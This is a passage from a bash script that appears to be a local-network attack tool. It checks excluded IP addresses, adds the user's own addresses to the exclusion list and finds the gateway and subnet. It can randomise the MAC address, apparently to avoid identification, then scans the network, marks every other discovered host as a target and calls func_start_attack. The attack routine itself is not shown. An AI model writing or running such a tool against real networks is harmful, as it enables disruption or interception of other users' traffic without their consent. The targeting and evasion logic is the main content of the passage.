        echo -e "${CGrn}[${CBRed}!${CGrn}]${CYel} Invalid IP Address: ${CRed}$IP${CClr}"
        # Flag invalid IP Address
        INVALID_IP=true
    fi
done

# If there is an invalid IP Address then exit
[[ ! -z $INVALID_IP ]] && echo && exit 1

# Get all of your IP Addresses and add to exclusion list
MY_IP=$(ip -o -4 a | awk '{print $4 }' | cut -d '/' -f1 | grep -v ^127 | tr '\n' ' ')
EXCLUDED_IP=$(echo "$MY_IP $EXCLUDED_IP" | tr ',' ' ' | tr -s ' ')

# Get network address from interface
NETWORK=$(ip -o -f inet addr show $INTERFACE 2>&1 | awk '/scope global/ {printf "%s\n",$4}')
[[ -z $NETWORK ]] && echo -e "\n${CGrn}[${CBRed}!${CGrn}]${CYel} Interface \"${CRed}$INTERFACE${CYel}\" doesn't connected to any network!${CClr}\n" && exit 1

# Get Gateway IP Address
GATEWAY=$(route -n | grep -w $INTERFACE | awk '{print $2}' | grep -v "0.0.0.0")

CIDR=$(echo $NETWORK | cut -d "/" -f2)

NETWORK="$GATEWAY/$CIDR"

# Open new terminal screen
tput smcup

# Trap func_cleanup on Interrupt (CTRL+C), Terminate, and Kill signal
trap func_cleanup SIGINT SIGTERM SIGKILL

if $RANDOMIZE_MAC
then
    func_randomize_mac
    NETWORK=$(ip -o -f inet addr show $INTERFACE 2>&1 | awk '/scope global/ {printf "%s\n",$4}')
fi

# Scan the network
func_scan_network

# Assign scanned hosts to target list
for HOST in "${HOSTS[@]}"
do
    IP=$(echo "$HOST" | cut -d ' ' -f1)
    TARGET_IP="$TARGET_IP $IP"
done

# Remove excluded IP from target list
for IP in $EXCLUDED_IP
do
    TARGET_IP=$(echo "$TARGET_IP" | sed "s/\<$IP\>//g")
done

# Finally START THE ATTACK!!!
func_start_attack
